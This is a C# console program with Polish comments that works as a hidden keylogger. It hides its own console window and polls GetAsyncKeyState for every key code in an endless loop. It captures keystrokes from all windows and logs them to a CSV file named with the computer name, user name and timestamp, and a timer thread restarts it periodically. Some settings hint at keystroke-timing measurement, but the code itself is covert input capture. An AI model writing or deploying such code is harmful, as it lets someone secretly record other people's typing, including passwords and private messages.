using ConsoleApp1.Configuration;
using ConsoleApp1.Files;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {//Zbieranie klawiszy z każdego okna

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 KeyNumber);
        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);


        //Ukrywanie terminala
        [DllImport("Kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);



        static void Main(string[] args)
        {
            //Przehwytywanie uhwytu terminala
            IntPtr hWnd = GetConsoleWindow();
            //Wyłączanie termina. Jeżeli jest wartość 0 to zostaje ukryty jeżeli 1 to zostanie pokazany
            ShowWindow(hWnd, 0);
            //Nazwa pliku konfiguracyjnego
            string path = @"Conf.txt";
            //Sprawdzanie czy istnieje plik konfiguracyjny
            if (!File.Exists(path))
            {
                StreamWriter sw = File.CreateText(path);
                sw.Close();
                File.AppendAllText(path, "Maksymalny czas miedzy kliknieciami=3000\n");
                File.AppendAllText(path, "Nazwa komputera=numer\n");
                File.AppendAllText(path, "Nazwa urzytkownika=nazwa\n");
                File.AppendAllText(path, "Czas do restartu programu=3600000");
            }
            List<string> config = new List<string>();
            //ładowanie pliku konfiguracyjnego
            if (File.Exists(path))
            {
                StreamReader sr = File.OpenText(path);
                string s = "";
                while ((s = sr.ReadLine()) != null)
                {
                    string tmp = "";
                    int howMenyChar = 0;
                    for (int i = s.Length - 1; i > 0; i--)
                    {
                        if (s[i] == '=')
                        {
                            break;
                        }
                        howMenyChar++;
                    }
                    for (int i = s.Length - howMenyChar; i < s.Length; i++)
                    {
                        tmp += s[i];
                    }
                    config.Add(tmp);
                }
            }
            start(config);
        }
        public static void start(List<string> config)
        {
            Control.Control control = new Control.Control();
            Time.Time time = new Time.Time();
            string data = config[1] + " " + config[2] + " ";
            data += time.ActualDay() + " " + time.ActualTime();
            Files.Files files = new Files.Files();
            data = data.Replace(':', ',');
            data = data.Replace('.', ',');
            data += ".csv";
            files.IsFile(data);
            Conf conf1 = new Conf();
            conf1.time = Convert.ToInt32(config[0]);
            conf1.ComputerName = config[1];
            conf1.User = config[2];
            object conf = conf1;
            Thread timer = new Thread(control.CloseProgram);
            timer.Start(conf);


            while (true)
            {

                Thread.Sleep(5);
                for (int i = 0; i < 255; i++)
                {

                    var keyStatus = GetAsyncKeyState(i);
                    //Wyrzucenie klawiszy ktury wysyłają kilkakrotnie sygnału klawiszy  Palt lub Pctrl, strzałki oraz przyciski myszy 
                    if (keyStatus == 32769 && !(i >= 17 && i <= 18) && !(i >= 162 && i <= 165) && (i != 1) && (i != 2) && !(i >= 37 && i <= 40))
                    {

                        bool isCapsLockToggled = Console.CapsLock;
                        control.control(i, data, Convert.ToInt32(config[0]));



                    }


                }
            }
        }
    }
}
